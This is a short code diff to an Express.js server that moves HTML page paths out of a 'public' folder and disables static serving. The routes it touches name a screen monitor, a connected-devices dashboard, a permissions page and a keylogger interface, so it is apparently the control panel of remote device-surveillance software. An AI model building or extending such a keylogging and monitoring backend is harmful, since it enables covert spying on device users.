@@ -21,7 +21,7 @@ const upload = multer({ dest: 'uploadedFile/' });
 const fs = require('fs');
 
 app.use(bodyParser.json());
-app.use(express.static('public'));
+// app.use(express.static('public'));
 
 let currentUuid = ''
 let currentNumber = ''
@@ -52,12 +52,12 @@ app.get('/', function (req, res) {
 
 // Screen Monitor Web Interface
 app.get('/screen-monitor', function (req, res) {
-    res.sendFile(__dirname + '/public/screen-monitor.html')
+    res.sendFile(__dirname + '/screen-monitor.html')
 })
 
 // Devices Dashboard
 app.get('/devices', function (req, res) {
-    res.sendFile(__dirname + '/public/devices.html')
+    res.sendFile(__dirname + '/devices.html')
 })
 
 // API: Get connected devices
@@ -145,12 +145,12 @@ app.get('/api/screen/:deviceId', function (req, res) {
 
 // Keylogger Web Interface
 app.get('/keylogger', function (req, res) {
-    res.sendFile(__dirname + '/public/keylogger.html')
+    res.sendFile(__dirname + '/keylogger.html')
 })
 
 // Permissions Web Interface
 app.get('/permissions', function (req, res) {
-    res.sendFile(__dirname + '/public/permissions.html')
+    res.sendFile(__dirname + '/permissions.html')
 })
 
 // API: Start keylogger
